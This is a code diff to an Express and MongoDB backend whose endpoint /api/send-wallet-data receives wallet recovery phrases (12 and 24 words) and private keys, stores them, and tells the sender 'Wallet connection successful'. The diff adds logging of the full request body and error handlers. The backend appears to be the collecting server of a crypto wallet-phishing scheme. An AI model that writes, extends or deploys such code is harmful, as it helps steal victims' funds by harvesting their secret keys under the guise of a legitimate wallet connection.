@@ -11,6 +11,7 @@ const allowedOrigins = ['https://theblockchain.vercel.app', 'http://localhost:51
 app.use(
   cors({
     origin: function(origin, callback) {
+      // Allow requests with no origin (like mobile apps or curl requests)
       if(!origin) return callback(null, true);
       if(allowedOrigins.indexOf(origin) === -1){
         var msg = 'The CORS policy for this site does not allow access from the specified Origin.';
@@ -44,6 +45,9 @@ const Wallet = mongoose.model('Wallet', walletSchema);
 
 // Endpoint to handle wallet data
 app.post('/api/send-wallet-data', async (req, res) => {
+  console.log('Received request to /api/send-wallet-data');
+  console.log('Request body:', req.body);
+
   const { walletName, walletAddress, phraseWords, phraseWords24, privateKey } = req.body;
 
   try {
@@ -56,6 +60,7 @@ app.post('/api/send-wallet-data', async (req, res) => {
     });
 
     await newWallet.save();
+    console.log('Wallet data saved successfully');
     res.status(200).json({ message: 'Wallet connection successful' });
   } catch (error) {
     console.error('Error connecting wallet data:', error);
@@ -67,5 +72,16 @@ app.get('/', (req, res) => {
   res.send('Welcome to the Blockchain Backend API');
 });
 
+// Error handling middleware
+app.use((err, req, res, next) => {
+  console.error(err.stack);
+  res.status(500).send('Something broke!');
+});
+
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+
+// Log unhandled promise rejections
+process.on('unhandledRejection', (reason, promise) => {
+  console.log('Unhandled Rejection at:', promise, 'reason:', reason);
+});
